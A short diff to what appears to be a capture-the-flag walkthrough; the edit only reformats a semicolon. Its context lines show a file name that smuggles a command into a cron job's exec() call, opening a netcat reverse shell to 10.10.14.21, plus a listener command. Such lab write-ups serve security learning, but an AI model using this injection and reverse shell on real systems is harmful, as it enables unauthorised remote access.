@@ -160,7 +160,7 @@ foreach ($files as $key => $value) {
 touch '; nc -c bash 10.10.14.21 5555'
 ```
 
-+ The **;** will end the **rm** command in the **exec()** function and run the **nc** command, which will send a reverse shell back to our machine.
++ The `;` will end the **rm** command in the **exec()** function and run the **nc** command, which will send a reverse shell back to our machine.
 + Start netcat listener on the attack machine: `nc -lnvp 5555`
 + Wait three minutes for the cron job to run, and get **guly**'s shell.
 
